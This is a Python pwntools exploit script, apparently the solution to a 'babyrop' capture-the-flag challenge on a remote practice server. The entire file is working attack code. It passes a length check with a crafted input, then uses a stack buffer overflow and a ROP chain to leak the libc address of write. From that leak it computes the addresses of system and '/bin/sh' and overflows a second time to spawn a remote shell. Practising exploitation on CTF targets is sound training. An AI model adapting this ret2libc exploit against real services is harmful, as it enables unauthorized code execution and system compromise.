#!/usr/bin/python
#__author__:TaQini

from pwn import *

local_file  = './babyrop'
local_libc  = '/lib/i386-linux-gnu/libc.so.6'
remote_libc = '../libc-2.23.so'
remote_host  = 'node3.buuoj.cn'
remote_port = 26891

DEBUG = False 
# DEBUG = True

if DEBUG:
	p = process(local_file)
	libc = ELF(local_libc)
else: 
	p = remote(remote_host,remote_port)
	libc = ELF(remote_libc)
elf = ELF(local_file)

context.log_level = 'debug'

# info
len = 235
main = 0x08048825
write = elf.symbols['write']
write_got = elf.got['write']
log.info('write.plt = ' + hex(write))
log.info('write.got = ' + hex(write_got))

# rop1
payload = '\0'+'\xff'*30
# gdb.attach(p)
p.sendline(payload)
p.recvuntil('Correct\n')

payload2 = 'A'*len
payload2 += p32(write) + p32(main) + p32(1) + p32(write_got) + p32(4) 
p.sendline(payload2)

write_libc = u32(p.recv(4))
log.warning('--------------')
log.info('write libc = '+hex(write_libc))
offset = write_libc - libc.symbols['write']
system = libc.symbols['system'] + offset
binsh = libc.search('/bin/sh').next() + offset
log.info('system libc = '+hex(system))
log.info('binsh libc = '+hex(binsh))

# rop2
payload = '\0'+'\xff'*30
# gdb.attach(p)
p.sendline(payload)
p.recvuntil('Correct\n')

payload2 = 'A'*len
payload2 += p32(system) + p32(0xdeadbeef) + p32(binsh) 
p.sendline(payload2)

p.interactive()

